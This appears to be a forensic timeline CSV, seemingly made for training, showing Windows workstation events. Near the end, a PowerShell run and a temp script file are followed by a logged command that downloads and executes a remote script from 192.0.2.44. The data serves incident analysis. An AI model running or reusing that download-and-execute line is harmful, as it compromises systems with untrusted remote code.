datetime,timestamp_desc,source,source_long,message,parser,display_name,tag
2026-03-14T08:00:03.120000+00:00,Content Modification Time,FILE,NTFS $MFT,File modified: C:\Windows\System32\drivers\etc\hosts,filestat,TSK:/Windows/System32/drivers/etc/hosts,
2026-03-14T08:00:44.500000+00:00,Last Access Time,LOG,WinPrefetch,"Prefetch [SVCHOST.EXE] was executed, run count 214",prefetch,OS:/Windows/Prefetch/SVCHOST.EXE-1B4A9C31.pf,
2026-03-14T08:01:10.000000+00:00,Creation Time,REG,Registry Key,[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WinDefend] Start: 2,winreg_default,TSK:/Windows/System32/config/SYSTEM,
2026-03-14T08:02:31.880000+00:00,Recorded Time,EVT,WinEVTX,"[4624 / 0x1210] An account was successfully logged on. Account Name: WKSTN01$, Logon Type: 5",winevtx,TSK:/Windows/System32/winevt/Logs/Security.evtx,
2026-03-14T08:05:02.000000+00:00,Last Visited Time,WEBHIST,Chrome History,https://update.example.com/patch/index.html (Example Update Service) [count: 3],chrome_27_history,OS:/Users/jdoe/AppData/Local/Google/Chrome/User Data/Default/History,
2026-03-14T08:09:17.330000+00:00,Content Modification Time,FILE,NTFS $MFT,File modified: C:\Windows\SoftwareDistribution\Download\install.esd,filestat,TSK:/Windows/SoftwareDistribution/Download/install.esd,
2026-03-14T08:12:00.000000+00:00,Recorded Time,EVT,WinEVTX,[1000 / 0x03e8] Windows Defender scan completed with no threats found.,winevtx,TSK:/Windows/System32/winevt/Logs/Application.evtx,
2026-03-14T08:20:41.000000+00:00,Last Access Time,LOG,WinPrefetch,"Prefetch [NOTEPAD.EXE] was executed, run count 12",prefetch,OS:/Windows/Prefetch/NOTEPAD.EXE-D8414F97.pf,
2026-03-14T08:31:55.000000+00:00,Creation Time,FILE,NTFS $MFT,File created: C:\Users\jdoe\Documents\quarterly-notes.docx,filestat,TSK:/Users/jdoe/Documents/quarterly-notes.docx,
2026-03-14T08:44:09.000000+00:00,Recorded Time,REG,UserAssist,"[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist] Value: Microsoft.Windows.Explorer, count 88",userassist,TSK:/Users/jdoe/NTUSER.DAT,
2026-03-14T09:02:13.000000+00:00,Last Access Time,LOG,WinPrefetch,"Prefetch [POWERSHELL.EXE] was executed, run count 1",prefetch,OS:/Windows/Prefetch/POWERSHELL.EXE-59FC8F3D.pf,
2026-03-14T09:02:58.441000+00:00,Creation Time,FILE,NTFS $MFT,File created: C:\Windows\Temp\update_check.ps1,filestat,TSK:/Windows/Temp/update_check.ps1,
2026-03-14T09:03:12.000000+00:00,Recorded Time,EVT,WinEVTX,"[4104 / 0x1008] Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.44/a.ps1')",winevtx,TSK:/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,
2026-03-14T09:04:30.000000+00:00,Recorded Time,EVT,WinEVTX,"[4688 / 0x1250] A new process has been created. New Process Name: C:\Windows\Temp\update_check.ps1, Creator Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",winevtx,TSK:/Windows/System32/winevt/Logs/Security.evtx,
